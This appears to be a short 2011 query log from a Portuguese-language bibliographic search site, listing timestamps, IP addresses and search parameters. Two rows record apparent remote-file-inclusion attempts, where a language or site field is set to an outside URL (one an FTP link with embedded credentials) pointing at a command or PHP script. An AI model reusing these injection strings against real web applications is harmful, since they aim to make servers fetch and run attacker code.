date;ip;lang;col;site;query;index;where;filter;from
2011-03-23 02:33:11;209.131.41.48;pt;local;bio;*;*;*;;1
2011-03-23 04:09:19;201.38.225.131;pt;local;bio;*;*;*;;1
2011-03-23 04:09:19;201.38.225.131;pt;local;bio;*;*;*;;1
2011-03-23 04:09:26;201.38.225.131;pt;local;bio;*;*;*;;1
2011-03-23 04:09:26;201.38.225.131;pt;local;bio;*;*;*;;1
2011-03-23 06:03:57;209.131.41.49;pt;local;bio;*;*;*;;1
2011-03-23 07:44:51;66.249.72.78;pt;local;bio;*;*;*;;1
2011-03-23 09:12:56;209.131.41.48;pt;local;bio;*;*;*;;1
2011-03-23 09:25:08;66.249.72.78;yiewkcbsz;local;bio;*;*;*;;1
2011-03-23 09:25:21;66.249.72.78;pt;local;bio;+id:("lil-13264049879");*;*;;1
2011-03-23 11:33:56;189.77.29.3;pt;local;bio;pericia;*;*;;1
2011-03-23 13:24:13;66.249.72.78;yiewkcbsz;local;bio;*;*;*;;1
2011-03-23 14:16:34;209.131.41.49;pt;local;bio;*;*;*;;1
2011-03-23 14:59:25;76.76.105.250;http://www.enaut.com.br/novo/galeria/images/galeria/cmd.so.txt?;local;bio;*;*;*;;1
2011-03-23 17:37:21;186.213.231.236;pt;local;ftp://pirutestes:k5k5k5@ftp.xpg.com.br/test.php?;*;*;*;;1
2011-03-23 18:35:24;209.131.41.49;pt;local;bio;*;*;*;;1
2011-03-23 21:31:27;66.249.72.78;pt;local;bio;*;*;*;;1
2011-03-23 22:42:17;66.249.72.78;pt;local;bio;*;*;SCIB;db:SCIB;1
2011-03-23 22:44:18;209.131.41.48;pt;local;bio;*;*;*;;1
